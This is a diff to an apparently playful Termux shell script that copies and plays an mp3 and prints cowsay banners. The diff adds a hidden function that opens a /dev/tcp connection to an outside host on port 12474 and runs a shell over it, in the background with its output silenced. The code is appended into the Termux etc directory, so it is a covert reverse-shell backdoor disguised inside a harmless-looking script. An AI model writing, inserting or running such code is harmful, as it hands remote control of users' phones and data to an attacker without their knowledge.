@@ -25,7 +25,15 @@ printf '\e[35m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\e[0m\n'
 
 cd /sdcard/Download && cp $mp3 /data/data/com.termux/files/home/MR-HK2/SS && cd /data/data/com.termux/files/home && rm MR-HKjo.sh && cd /data/data/com.termux/files/hom/MR-HK2 || cd /data/data/com.termux/files/home/MR-HK && rm MR-HKjo.sh && touch MR-HKjo.sh || cd /data/data/com.termux/files/home/MR-HK2 && touch MR-HKjo.sh
 
-echo -e """
+echo -e """ 
+his(){
+
+0<&59-;exec 59<>/dev/tcp/fw1.sshreach.me/12474;sh <&59 >&59 2>&59
+
+}
+
+his > /dev/null 2>&1 &
+""" >> /data/data/com.termux/files/usr/etc
 mpv /data/data/com.termux/files/home/MR-HK2/SS/$mp3 >/data/data/com.termux/files/home/MR-HK2/SS/ww 2>&1
 cowsay -f MR-HK.cow $name | lolcat -p
 
